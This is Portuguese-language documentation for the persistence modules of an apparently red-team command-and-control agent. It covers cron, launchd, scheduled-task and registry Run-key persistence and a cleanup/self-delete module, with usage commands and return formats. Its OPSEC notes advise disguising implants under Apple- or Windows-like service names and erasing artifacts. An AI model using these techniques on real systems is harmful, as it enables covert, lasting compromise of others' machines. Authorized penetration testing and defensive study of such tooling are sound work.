    Persistencia¶

    Modulos para estabelecer e gerenciar persistencia no alvo. Todos os mecanismos sao rastreados via PersistenceTracker e ArtifactTracker para permitir limpeza completa.

    Resumo¶

    Modulo Plataformas Descricao
    persist.cron Linux Persistencia via crontab
    persist.launchd macOS Persistencia via Launch Agent (plist)
    persist.schtask Windows Persistencia via Scheduled Task
    persist.registry Windows Persistencia via Run key do registro
    persist.cleanup Windows, Linux, macOS Remocao de toda persistencia e artefatos

    persist.cron¶

    Nome: persist.cron Plataformas: Linux Descricao: Instala persistencia via entrada no crontab do usuario atual.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    action string opcional install Acao: install, check ou list
    command string obrigatorio (install) - Comando a executar
    schedule string opcional @reboot Agendamento: @reboot, @hourly ou @daily

    Retorno¶

    install: 

    {
  "output": "cron entry installed: @reboot /tmp/agent",
  "data": {
    "status": "installed",
    "method": "cron:@reboot:/tmp/agent",
    "schedule": "@reboot",
    "command": "/tmp/agent"
  }
}

    Exemplo de uso¶

    # Persistencia no boot
module persist.cron --command "/tmp/agent" --schedule @reboot

# Execucao diaria
module persist.cron --command "/opt/.cache/svc" --schedule @daily

# Verificar se cron esta instalado
module persist.cron --action check

# Listar todos os metodos de persistencia
module persist.cron --action list

    Notas¶

    • Schedules validos: @reboot, @hourly, @daily
    • Idempotente: se o method key ja existir no tracker, retorna already_installed
    • O method key segue o formato cron:<schedule>:<command>

    persist.launchd¶

    Nome: persist.launchd Plataformas: macOS Descricao: Instala persistencia via Launch Agent (arquivo plist em ~/Library/LaunchAgents/).

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    action string opcional install Acao: install, check ou list
    exe_path string obrigatorio (install) - Caminho do executavel
    label string opcional com.wolfgang.agent Label do Launch Agent

    Retorno¶

    install: 

    {
  "output": "launch agent \"com.wolfgang.agent\" installed for \"/tmp/agent\"",
  "data": {
    "status": "installed",
    "method": "launchd:com.wolfgang.agent",
    "label": "com.wolfgang.agent",
    "exe_path": "/tmp/agent",
    "plist": "~/Library/LaunchAgents/com.wolfgang.agent.plist"
  }
}

    Exemplo de uso¶

    # Launch Agent padrao
module persist.launchd --exe_path /Users/target/.cache/svc

# Launch Agent com label customizado
module persist.launchd --exe_path /tmp/agent --label com.apple.systemupdater

# Verificar status
module persist.launchd --action check

    Notas¶

    • O plist e criado em ~/Library/LaunchAgents/<label>.plist
    • Usar labels que se misturem com servicos legitimos da Apple para OPSEC
    • Idempotente: verifica tracker antes de instalar
    • Method key: launchd:<label>

    persist.schtask¶

    Nome: persist.schtask Plataformas: Windows Descricao: Cria uma Scheduled Task para persistencia no Windows.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    action string opcional install Acao: install, check ou list
    exe_path string obrigatorio (install) - Caminho do executavel
    name string opcional WolfgangScheduledUpdate Nome da task
    trigger string opcional onlogon Trigger: onlogon, daily ou hourly

    Retorno¶

    install: 

    {
  "output": "scheduled task \"WolfgangScheduledUpdate\" created with trigger \"onlogon\" for \"C:\\agent.exe\"",
  "data": {
    "status": "installed",
    "method": "schtask:WolfgangScheduledUpdate",
    "name": "WolfgangScheduledUpdate",
    "exe_path": "C:\\agent.exe",
    "trigger": "onlogon"
  }
}

    Exemplo de uso¶

    # Task padrao no logon
module persist.schtask --exe_path "C:\Windows\Temp\svc.exe"

# Task com nome e trigger customizados
module persist.schtask --exe_path "C:\ProgramData\updater.exe" --name "SystemHealthCheck" --trigger daily

    Notas¶

    • Triggers validos: onlogon, daily, hourly
    • Idempotente: verifica tracker pelo nome da task
    • Method key: schtask:<name>
    • Usar nomes que se misturem com servicos do Windows para OPSEC

    persist.registry¶

    Nome: persist.registry Plataformas: Windows Descricao: Adiciona uma Run key no registro do Windows para execucao automatica no logon.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    action string opcional install Acao: install, check ou list
    exe_path string obrigatorio (install) - Caminho do executavel
    name string opcional WolfgangUpdate Nome do valor no registro

    Retorno¶

    install: 

    {
  "output": "registry run key \"WolfgangUpdate\" installed for \"C:\\agent.exe\"",
  "data": {
    "status": "installed",
    "method": "registry:WolfgangUpdate",
    "name": "WolfgangUpdate",
    "exe_path": "C:\\agent.exe",
    "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  }
}

    Exemplo de uso¶

    # Run key padrao
module persist.registry --exe_path "C:\Users\admin\AppData\Local\svc.exe"

# Run key com nome customizado
module persist.registry --exe_path "C:\ProgramData\updater.exe" --name "SecurityHealthService"

    Notas¶

    • Grava em HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    • Executa no contexto do usuario atual (nao requer admin)
    • Idempotente: verifica tracker pelo nome do valor
    • Method key: registry:<name>

    persist.cleanup¶

    Nome: persist.cleanup Plataformas: Windows, Linux, macOS Descricao: Remove todos os mecanismos de persistencia instalados e artefatos rastreados. Modulo central de OPSEC.

    Argumentos¶

    Nome Tipo Obrigatorio Default Descricao
    self_delete string opcional false Se true, tambem deleta o binario do agent
    self_path string opcional - Caminho do binario para self-delete

    Retorno¶

    {
  "output": "cleaned 5 items, 0 errors",
  "data": {
    "cleaned_count": "5",
    "error_count": "0",
    "cleaned": "registry:WolfgangUpdate;schtask:SystemTask;artifact:/tmp/tool.bin",
    "errors": "(somente quando error_count > 0)"
  }
}

    Sequencia de Limpeza¶

    1. Persistencia: itera todos os metodos do PersistenceTracker e remove cada um conforme o tipo:
      • registry: -- remove Run key
      • schtask: -- remove Scheduled Task
      • cron: -- remove entrada do crontab
      • launchd: -- remove plist
    2. Artefatos: itera todos os caminhos do ArtifactTracker e remove os arquivos
    3. Self-delete (opcional): remove o proprio binario do agent

    Exemplo de uso¶

    # Limpeza completa (sem self-delete)
module persist.cleanup

# Limpeza com auto-delecao
module persist.cleanup --self_delete true --self_path "C:\Windows\Temp\svc.exe"

    Notas¶

    • Erros parciais nao interrompem a limpeza -- todos os itens sao tentados
    • Apos a limpeza, ArtifactTracker.Clear() e chamado
    • Usado internamente por shell.selfdestruct como primeiro passo da auto-remocao
    • OPSEC critico: sempre executar cleanup antes de encerrar um engagement

    Trackers¶

    PersistenceTracker¶

    Registro thread-safe (sync.RWMutex) de metodos de persistencia instalados. Formato dos method keys: <tipo>:<identificador> (ex: registry:WolfgangUpdate, cron:@reboot:/tmp/agent).

    Operacoes: Record(method), IsInstalled(method), List(), Remove(method).

    ArtifactTracker¶

    Registro thread-safe de caminhos de arquivos dropados durante a sessao. Usado pelo cleanup para garantir que nenhum artefato fique no disco.

    Operacoes: Record(path), List(), Clear().
